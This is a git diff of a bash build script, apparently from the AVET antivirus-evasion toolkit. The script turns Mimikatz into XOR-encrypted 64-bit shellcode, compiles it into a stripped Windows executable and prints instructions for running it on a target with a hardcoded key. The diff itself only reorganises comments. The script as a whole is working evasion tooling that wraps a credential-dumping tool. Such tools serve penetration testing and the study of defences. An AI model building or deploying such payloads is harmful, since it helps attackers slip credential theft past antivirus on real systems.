@@ -1,17 +1,16 @@
 #!/bin/bash
+
+
+#DESCRIPTION_START
 # Example script that uses an executable file as input, here Mimikatz.
 # Converts the exe to shellcode using the pe_to_shellcode tool by Hasherezade:
 # https://github.com/hasherezade/pe_to_shellcode
 #
 # This script expects the Mimikatz executable to be at input/mimikatz.exe
 # and the pe_to_shellcode executable to reside in a folder parallel to avet: ../pe_to_shellcode/pe2shc.exe
-#
 # Executes the executable as 64-bit shellcode.
 # Applied XOR encryption with a dynamic key, provided from the command line at run time.
-# The decryption key is     aabbccddee
-# You need to provide the decryption key as 2nd command line argument.
-# Call generated executable on target like:
-# mimikatz_pe2shc_xorfromcmd_win64.exe 'your mimikatz arguments, probably coffee' aabbccddee
+#DESCRIPTION_END
 
 
 # include script containing the compiler var $win64_compiler
@@ -25,9 +24,15 @@
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# enable debug print
+enable_debug_print
+#CONFIGURATION_END
+
 
 # no preexec command
 set_command_source no_data
@@ -60,9 +65,6 @@ set_decoder xor
 # select 64-bit shellcode binding technique
 set_payload_execution_method exec_shellcode64
 
-# enable debug print
-enable_debug_print
-
 # compile final payload
 $win64_compiler -o output/mimikatz_pe2shc_xorfromcmd_win64.exe source/avet.c
 strip output/mimikatz_pe2shc_xorfromcmd_win64.exe
@@ -73,3 +75,11 @@ cleanup_techniques
 echo "
 # Call generated executable on target like:
 # mimikatz_pe2shc_xorfromcmd_win64.exe 'your mimikatz arguments, probably coffee' [key]"
+
+
+#USAGE_START
+# The decryption key is     aabbccddee
+# You need to provide the decryption key as 2nd command line argument.
+# Call generated executable on target like:
+# mimikatz_pe2shc_xorfromcmd_win64.exe 'your mimikatz arguments, probably coffee' aabbccddee
+#USAGE_END
